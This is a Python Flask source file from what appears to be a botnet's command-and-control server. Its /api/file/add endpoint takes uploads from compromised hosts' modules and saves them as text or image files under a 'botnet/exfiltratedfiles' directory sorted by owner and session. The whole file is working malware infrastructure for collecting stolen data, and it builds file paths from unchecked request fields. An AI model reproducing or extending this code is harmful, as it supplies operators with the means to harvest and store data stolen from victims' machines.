import os
from flask import Blueprint, request
import time
from botnet.dao import file_dao

file = Blueprint('file', __name__)


@file.route("/api/file/add", methods=["POST"])
def file_add():
    data = request.form.get('data')
    filetype = request.form.get('type')
    owner = request.form.get('owner')
    module = request.form.get('module')
    session = request.form.get('session')
    filename = module + '_' + time.ctime(time.time()).replace(' ', '_').replace(':', '-')

    filename += '.' + filetype
    session = session.replace(' ', '_').replace(':', '-')
    output_path = os.path.join('botnet/exfiltratedfiles', owner, session)
    if not os.path.isdir(output_path):
        try:
            os.makedirs(output_path)
        except:
            print("Error creating directory for exfiltrated files")
        
    file_dao.add_user_file(owner, filename, session, module)

    if filetype == 'txt':
        with open(os.path.join(os.path.abspath(output_path), filename), 'w') as f:
            f.write(data)
    elif filetype in ['png', 'jpg', 'jpeg', 'gif']:
        uploaded_file = request.files.get('file')
        uploaded_file.save(os.path.join(os.path.abspath(output_path), filename))
        # with open(os.path.join(os.path.abspath(output_path), filename), 'wb') as f:
        #     f.write(data)
        
    return "File saved successfully"

